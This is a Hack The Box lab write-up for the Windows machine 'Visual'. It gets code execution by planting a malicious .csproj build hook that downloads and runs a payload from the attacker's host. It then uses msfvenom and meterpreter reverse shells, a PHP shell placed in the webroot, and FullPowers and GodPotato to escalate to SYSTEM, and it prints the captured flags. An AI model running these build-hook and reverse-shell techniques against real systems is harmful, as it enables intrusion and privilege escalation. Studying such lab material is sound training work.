HacktheBox Medium Machine
first scan 
```terminal
└─# nmap $ip
Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-02 11:43 EDT
Nmap scan report for 10.10.11.234
Host is up (0.39s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 38.44 seconds
```
Second time 

```terminal
┌──(root㉿1337)-[/home/bloman]
└─# nmap -sV -A --min-rate 5000 $ip
Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-02 11:44 EDT
Stats: 0:01:14 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 84.93% done; ETC: 11:45 (0:00:00 remaining)
Nmap scan report for 10.10.11.234
Host is up (0.50s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.1.17)
|_http-title: Visual - Revolutionizing Visual Studio Builds
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.1.17
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Network Distance: 3 hops

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   ... 2
3   468.80 ms 10.10.11.234
```
Now directory fuzzing

```terminal
└─# ffuf -u http://$ip/FUZZ -w /usr/share/dirb/wordlists/common.txt
js
css
assets
aux
uploads  but not works

```
I used diresearch and it's find a lot of interesting files
```terminal


```
this : http://10.10.11.234/index.php/login/
also in the index.php i need to submit a github repo and he compile it that will help me to get a shell

Create a new C# web console dot6.0 project. Any hello world project is fine.
`dotnet new console -n HelloWorldApp`

`└─#  git --bare update-server-info
`
commit changes. and then add my shell on it 

All of these not work.
trying another method
`We currently support .NET 6.0 and C# programs, so make sure your Git Repo includes a .sln file for successful compilation. Trust Visual to simplify and streamline your project compilation process like never before.`
recreate a .net repo
```
dotnet new sln -o Repo
cd Repoe
dotnet new console -o Repo.ConsoleApp --framework net6.0
dotnet sln Repo.sln add Repo.ConsoleApp/Repo.ConsoleApp.csproj
```

Now access to the directory and ask chatGPT to create a hello world program in C#
```
namespace Program
{
 public class Program
 {
  public static void Main(string[] args)
  {
   Console.WriteLine("Hello world");
  }
 }
}
```
Then we will create the post build `Repo.ConsoleApp.csproj`
```
<Target Name="PreBuild" BeforeTargets="PreBuildEvent">
  <Exec Command="certutil -urlcache -f http://10.10.14.5:4243/s.exe %temp%/s.exe" />
</Target>

<Target Name="PostBuild" AfterTargets="PostBuildEvent">
  <Exec Command="start %temp%/s.exe" />
</Target>
```

Let's generate a shell and start the listener
`└─# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.15.62 LPORT=1337 -f exe > s.exe`

```
msf6 > use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set lport 1337
lport => 1337
msf6 exploit(multi/handler) > set lhost tun0
lhost => tun0
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.15.62:1337 


```


# Second Day of Trying

```
dotnet new sln -o Repo
cd Repoe
dotnet new console -o Repo.ConsoleApp --framework net6.0
dotnet sln Repo.sln add Repo.ConsoleApp/Repo.ConsoleApp.csproj
```


## Third Try
i used the vs-rce and add my csproj
`https://www.ired.team/offensive-security/code-execution/using-msbuild-to-execute-shellcode-in-c` ressources

and here i got a shell: wow
```
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.14.109:1337 
[*] Sending stage (200774 bytes) to 10.10.11.234

[*] Meterpreter session 1 opened (10.10.14.109:1337 -> 10.10.11.234:49674) at 2023-10-03 11:37:36 -0400

meterpreter > 
meterpreter > sessions 
Usage: sessions <id>

Interact with a different session Id.
This works the same as calling this from the MSF shell: sessions -i <session id>

meterpreter > shell
Process 3612 created.
Channel 1 created.
Microsoft Windows [Version 10.0.17763.4851]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\Temp\60f033fc699d24d28c9f114a0e882a\rce>whoami
whoami
visual\enox

```

```

 Directory of C:\Users

06/10/2023  10:59 AM    <DIR>          .
06/10/2023  10:59 AM    <DIR>          ..
09/12/2023  02:02 AM    <DIR>          Administrator
09/12/2023  02:27 AM    <DIR>          enox
06/10/2023  10:08 AM    <DIR>          Public
               0 File(s)              0 bytes
               5 Dir(s)   8,919,076,864 bytes free
 Directory of C:\Users\enox\Desktop

06/10/2023  01:10 PM    <DIR>          .
06/10/2023  01:10 PM    <DIR>          ..
10/03/2023  08:20 AM                34 user.txt
               1 File(s)             34 bytes
               2 Dir(s)   8,919,076,864 bytes free

C:\Users\enox\Desktop>type user.txt
type user.txt
59065825ff3c6a417ecaf08fde12c413

```

Now 
## Escalation
Our user has the ability to write to the C:\xampp\htdocs directory. Let's generate a shell, load it and catch it using the analogy above.
```
┌──(root㉿1337)-[/home/…/HacktheBox/Season/vs-rce/rce]
└─# msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.14.109 LPORT=1338 -f raw > exploit.php
[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
[-] No arch selected, selecting arch: php from the payload
No encoder specified, outputting raw payload
Payload size: 1113 bytes

```
Now go to my shell and do : `curl http://10.10.11.234/8a.php`
I send the exploit in the machine then i opened a listner
```
 Directory of C:\xampp\htdocs

10/03/2023  09:07 AM    <DIR>          .
10/03/2023  09:07 AM    <DIR>          ..
06/10/2023  10:32 AM    <DIR>          assets
06/10/2023  10:32 AM    <DIR>          css
10/03/2023  09:07 AM             1,113 hack.php
06/10/2023  06:20 PM             7,534 index.php
06/10/2023  10:32 AM    <DIR>          js
06/10/2023  04:17 PM             1,554 submit.php
10/03/2023  08:34 AM    <DIR>          uploads
06/10/2023  04:11 PM             4,970 vs_status.php
               4 File(s)         15,171 bytes
               6 Dir(s)   8,915,329,024 bytes free


```

```
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.14.109:1338 
[*] Sending stage (39927 bytes) to 10.10.11.234
[*] Meterpreter session 1 opened (10.10.14.109:1338 -> 10.10.11.234:49679) at 2023-10-03 12:08:23 -0400

meterpreter > 
meterpreter > sysinfo 
Computer    : VISUAL
OS          : Windows NT VISUAL 10.0 build 17763 (Windows Server 2019) AMD64
Meterpreter : php/windows
meterpreter > shell 
Process 1948 created.
Channel 0 created.
Microsoft Windows [Version 10.0.17763.4851]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\xampp\htdocs>


```
Download FullPowers.exe (https://github.com/itm4n/FullPowers) and extend privileges. 

get another shell
`┌──(root㉿1337)-[/home/…/HacktheBox/Season/vs-rce/rce]
└─# msfvenom -p windows/shell/reverse_tcp LHOST=10.10.14.109 LPORT=1338 -f exe > hack.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of exe file: 73802 bytes`

Now used revshells ivan shells to get local privilge using nc 
```
└─# nc -lvnp 1338
listening on [any] 1338 ...
connect to [10.10.14.109] from (UNKNOWN) [10.10.11.234] 49679
SOCKET: Shell has connected! PID: 1804
Microsoft Windows [Version 10.0.17763.4851]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\xampp\htdocs>whoami
nt authority\local service

C:\xampp\htdocs>
```
Now i will execute fullpowers
```
C:\xampp\htdocs>curl -o FullPowers.exe http://10.10.14.109:2222/FullPowers.exe
C:\xampp\htdocs>fullpowers
[+] Started dummy thread with id 3732
[+] Successfully created scheduled task.
[+] Got new token! Privilege count: 7
[+] CreateProcessAsUser() OK
Microsoft Windows [Version 10.0.17763.4851]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>

```
Wow now i am on system32
Now i will execute the GodPotato.exe
and run this 
```
C:\xampp\htdocs>God.exe -cmd "cmd /c whoami"
[*] CombaseModule: 0x140730318651392
[*] DispatchTable: 0x140730320957552
[*] UseProtseqFunction: 0x140730320333728
[*] UseProtseqFunctionParamCount: 6
[*] HookRPC
[*] Start PipeServer
[*] CreateNamedPipe \\.\pipe\64df23d3-f883-443c-bb55-1cda6ae5c72e\pipe\epmapper
[*] Trigger RPCSS
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
[*] DCOM obj IPID: 00005402-0458-ffff-2979-9a6d5c4ba030
[*] DCOM obj OXID: 0x8fce7fdb7b411738
[*] DCOM obj OID: 0x82e5f55f26ef58d9
[*] DCOM obj Flags: 0x281
[*] DCOM obj PublicRefs: 0x0
[*] Marshal Object bytes len: 100
[*] UnMarshal Object
[*] Pipe Connected!
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
[*] CurrentsImpersonationLevel: Impersonation
[*] Start Search System Token
[*] PID : 872 Token:0x808  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
[*] Find System Token : True
[*] UnmarshalObject: 0x80070776
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid 2440
nt authority\system

```
make a windows x64 shell and run it using the GodPotato to impressionate as NT authority
```
C:\xampp\htdocs>GodPotato-NET4.exe -cmd "C:\xampp\htdocs\uploads\rev.exe"
[*] CombaseModule: 0x140714977132544

msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.14.109:2023 
[*] Sending stage (200774 bytes) to 10.10.11.234

[*] Meterpreter session 1 opened (10.10.14.109:2023 -> 10.10.11.234:49685) at 2023-10-03 19:13:28 -0400

meterpreter > 
meterpreter > 
meterpreter > sysinfo 
Computer        : VISUAL
OS              : Windows 2016+ (10.0 Build 17763).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x64/windows
meterpreter > shell
Process 2040 created.
Channel 1 created.
Microsoft Windows [Version 10.0.17763.4851]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\xampp\htdocs>whoami
whoami
nt authority\system

C:\xampp\htdocs>

```
```

 Directory of C:\Users\Administrator\Desktop

09/19/2023  08:20 AM    <DIR>          .
09/19/2023  08:20 AM    <DIR>          ..
10/03/2023  03:41 PM                34 root.txt
               1 File(s)             34 bytes
               2 Dir(s)   8,916,811,776 bytes free

C:\Users\Administrator\Desktop>type root.txt
type root.txt
dba61b54184be6dd2f3ca08c386cb473

C:\Users\Administrator\Desktop>
```